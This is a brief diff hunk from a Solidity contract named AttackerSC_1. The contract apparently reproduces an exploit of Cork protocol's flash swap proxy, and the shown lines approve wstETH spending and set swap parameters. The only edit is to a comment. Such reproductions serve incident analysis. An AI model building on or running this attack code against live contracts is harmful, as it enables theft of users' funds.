@@ -59,7 +59,7 @@ contract AttackerSC_1 {
         // Step 1.6. Approve wstETH to Cork's Proxy and call swapRaforDs
         wstETH.approve(address(flashSwapProxy), type(uint256).max);
 
-        // Standard default values
+        // Standard default values according to Cork's Interface suggestion
         IPSMProxy.BuyAprroxParams memory buyParams;
         buyParams.maxFeeIter = 108;
         buyParams.maxApproxIter = 256;
